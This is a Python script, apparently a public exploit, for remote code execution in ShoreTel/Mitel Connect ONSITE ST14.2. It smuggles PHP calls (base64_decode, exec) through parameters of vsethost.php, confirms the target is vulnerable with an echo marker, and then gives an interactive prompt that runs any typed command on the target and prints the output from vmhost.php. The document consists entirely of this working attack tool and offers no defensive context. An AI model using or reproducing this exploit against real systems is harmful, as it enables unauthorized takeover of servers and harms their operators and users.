# ShoreTel/Mitel Connect ONSITE ST14.2 Remote Code Execution
# https://blog.eviltwin.id/2021/06/shoretel-mitel-connect-on-site-st142-rce.html

import base64, requests, sys
import readline
i = "\033[1;32m"
m = "\033[1;31m"
p = "\033[1;37m"
k = "\033[1;33m"
def build_shoretel(cmd):
	obj = {
		"hostId": "system",
		"keyCode": "base64_decode",
		"meetingType": "{${gKeyCode}($gSessionDir)}",
		"sessionDir": base64.b64encode(bytes(cmd, "utf-8")).decode("ascii"),
		"swfServer": "{${gHostID}($gMeetingType)}",
		"server": "exec",
		"dir": "/usr/share/apache2/htdocs/wc2_deploy/scripts/"
	}
	return obj

def exploit():
	if len(sys.argv) < 2: sys.exit("Usage: python evil_rce.py http://target.com")
	url = sys.argv[1]
	c = requests.get(url+"/scripts/vsethost.php",params = build_shoretel("echo bWVua3JlcDEzMzcK"))
	if requests.get(url+"/scripts/vmhost.php").text.strip() == "bWVua3JlcDEzMzcK":
		print(p + sys.argv[1] + k + " ->" + i + " Vuln!")
		while True:
			cmd = input(p + "Command: ")
			requests.get(url+"/scripts/vsethost.php", params = build_shoretel(cmd))
			c = requests.get(url+"/scripts/vmhost.php")
			print(c.text if c.text != "" else "No output")
	else:
		print(p + sys.argv[1] + k + " ->" + m + " Not vuln :(")
exploit()
